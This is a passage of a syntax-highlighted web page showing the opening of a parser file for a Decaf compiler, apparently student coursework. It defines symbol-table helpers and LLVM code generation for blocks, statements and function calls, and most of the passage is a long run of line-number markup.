class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafexpr.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this global variable contains all the generated code</span></span><br><span class="line">llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt; symbol_table;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">list</span>&lt;symbol_table &gt; symbol_table_list;</span><br><span class="line">symbol_table symtbl;</span><br><span class="line">symbol_table_list symtblt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is the method used to construct the LLVM intermediate code (IR)</span></span><br><span class="line">llvm::LLVMContext TheContext;</span><br><span class="line">llvm::LLVMContext &amp;Context = TheContext;</span><br><span class="line">llvm::IRBuilder&lt;&gt; Builder(TheContext);</span><br><span class="line"><span class="comment">// the calls to TheContext in the init above and in the</span></span><br><span class="line"><span class="comment">// following code ensures that we are incrementally generating</span></span><br><span class="line"><span class="comment">// instructions in the right order</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dummy main function</span></span><br><span class="line"><span class="comment">// WARNING: this is not how you should implement code generation</span></span><br><span class="line"><span class="comment">// for the main function!</span></span><br><span class="line"><span class="comment">// You should write the codegen for the main method as </span></span><br><span class="line"><span class="comment">// part of the codegen for method declarations (MethodDecl)</span></span><br><span class="line"><span class="keyword">static</span> llvm::Function *TheFunction = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> get_return;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbolt</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s:symtblt)&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span> (it = s.begin(); it != s.end(); it++) &#123;</span><br><span class="line">            <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">            <span class="keyword">if</span>(name == s)</span><br><span class="line">                <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbol</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s)</span><br><span class="line">            <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbolt</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtblt.front()[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtblt.front()[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbol</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtbl[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtbl[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_symbol</span><span class="params">(<span class="built_in">string</span> name, llvmValue k)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s &amp;&amp; it-&gt;second-&gt;kind == k)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafBlock::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    symbol_table s;</span><br><span class="line">    symtblt.push_front(s);</span><br><span class="line">    llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">        val = FieldDeclList-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != StateDeclList) &#123;</span><br><span class="line">        val = StateDeclList-&gt;Codegen();</span><br><span class="line">    &#125; </span><br><span class="line">    symtblt.pop_front();</span><br><span class="line">    <span class="keyword">return</span> val; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafStmt::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dass)&#123;</span><br><span class="line">        decafAssign* s = (decafAssign*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dcall)&#123;</span><br><span class="line">        decafFunCall* s = (decafFunCall*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dblo)&#123;</span><br><span class="line">        decafBlock* s = (decafBlock*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dret)&#123;</span><br><span class="line">        decafReturn* s = (decafReturn*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafFunCall::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    llvm::Function * llvm_func = des-&gt;func;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Value *&gt; putsargs;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; putstypes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; arg : llvm_func-&gt;args()) &#123;</span><br><span class="line">        llvm::Type* func_type = arg.getType();</span><br><span class="line">        putstypes.push_back(func_type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para())&#123;</span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = (decafBinexp *)p;</span><br><span class="line">        llvm::Value* vt = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        llvm::Type* func_type = putstypes[i++];</span><br><span class="line">      </span><br><span class="line">        vt = Builder.CreateZExt(vt, func_type, <span class="string">&quot;zexttmp&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(exp-&gt;get_kind() != &quot;VariableExpr&quot;)&#123;</span></span><br><span class="line"><span class="comment">            llvm::ConstantInt* constantInt = llvm::dyn_cast&lt;llvm::ConstantInt&gt;(vt);</span></span><br><span class="line"><span class="comment">            if (constantInt) &#123;</span></span><br><span class="line"><span class="comment">                llvm::APInt apIntValue = constantInt-&gt;getValue();</span></span><br><span class="line"><span class="comment">                int intValue = apIntValue.getZExtValue();</span></span><br><span class="line"><span class="comment">                vt = llvm::ConstantInt::get(func_type, intValue);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125; </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        putsargs.push_back(vt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    llvm::Value *ret_value = Builder.CreateCall(llvm_func, putsargs);</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br><span 